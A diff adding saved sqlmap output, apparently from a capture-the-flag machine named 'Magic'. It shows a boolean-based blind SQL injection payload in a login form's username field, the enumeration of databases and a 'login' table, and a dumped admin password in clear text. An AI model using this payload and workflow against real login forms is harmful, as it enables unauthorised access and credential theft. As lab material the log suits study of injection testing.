@@ -1,0 +1,51 @@
+sqlmap identified the following injection point(s) with a total of 329 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: username=-4434' OR 2382=2382-- BsYl&password=admin
+---
+back-end DBMS: MySQL >= 5.0.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: username=-4434' OR 2382=2382-- BsYl&password=admin
+---
+back-end DBMS: MySQL 5
+available databases [2]:
+[*] information_schema
+[*] Magic
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: username=-4434' OR 2382=2382-- BsYl&password=admin
+---
+back-end DBMS: MySQL 5
+Database: Magic
+[1 table]
++-------+
+| login |
++-------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: username=-4434' OR 2382=2382-- BsYl&password=admin
+---
+back-end DBMS: MySQL 5
+Database: Magic
+Table: login
+[1 entry]
++------+----------+----------------+
+| id   | username | password       |
++------+----------+----------------+
+| 1    | admin    | Th3s3usW4sK1ng |
++------+----------+----------------+
+
